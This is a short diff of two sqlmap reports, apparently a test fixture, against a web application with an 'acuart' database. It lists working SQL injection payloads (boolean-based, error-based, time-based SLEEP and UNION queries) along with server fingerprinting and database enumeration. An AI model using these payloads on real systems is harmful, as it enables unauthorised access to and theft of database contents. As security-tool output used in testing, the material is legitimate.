@@ -1,25 +1,13 @@
-sqlmap identified the following injection point(s) with a total of 253 HTTP(s) requests:
+sqlmap identified the following injection point(s) with a total of 131 HTTP(s) requests:
 ---
-Parameter: artist (GET)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: artist=1 AND 5090=5090
-
-    Type: error-based
-    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
-    Payload: artist=1 AND GTID_SUBSET(CONCAT(0x716a766271,(SELECT (ELT(1668=1668,1))),0x717a707671),1668)
-
-    Type: time-based blind
-    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-    Payload: artist=1 AND (SELECT 8828 FROM (SELECT(SLEEP(1)))jqQx)
-
+Parameter: test (GET)
     Type: UNION query
     Title: MySQL UNION query (NULL) - 3 columns
-    Payload: artist=-3835 UNION ALL SELECT NULL,CONCAT(0x716a766271,0x69436f685942494245596a6a6c4941624a4e79777977476c6547506c4f684f7678666e6571724b57,0x717a707671),NULL#
+    Payload: test=query' UNION ALL SELECT NULL,CONCAT(0x716b787a71,0x4d7a686654696d494d6441666a434b7a4e594a6a44764168487050704c68776962774d6e7673644a,0x7162706b71),NULL#
 ---
 web server operating system: Linux Ubuntu
-web application technology: PHP 5.6.40, Nginx 1.19.0
-back-end DBMS: MySQL >= 5.6
+web application technology: Nginx 1.19.0, PHP 5.6.40
+back-end DBMS: MySQL
 available databases [2]:
 [*] acuart
 [*] information_schema
